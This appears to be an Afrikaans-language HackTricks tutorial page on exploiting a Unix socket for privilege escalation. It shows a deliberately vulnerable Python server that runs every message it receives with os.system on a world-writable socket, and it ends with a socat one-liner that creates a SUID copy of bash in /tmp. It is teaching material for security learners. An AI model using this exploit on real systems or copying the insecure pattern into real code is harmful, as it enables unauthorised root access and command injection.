{{#include ../../banners/hacktricks-training.md}}

## Voorbeeld van socket binding met Python

In die volgende voorbeeld word 'n **unix socket geskep** (`/tmp/socket_test.s`) en alles wat **ontvang** word, gaan **uitgevoer** word deur `os.system`. Ek weet dat jy dit nie in die natuur gaan vind nie, maar die doel van hierdie voorbeeld is om te sien hoe 'n kode wat unix sockets gebruik lyk, en hoe om die invoer in die ergste geval te bestuur.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**Voer** die kode uit met python: `python s.py` en **kyk hoe die socket luister**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Eksploiteer**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
{{#include ../../banners/hacktricks-training.md}}
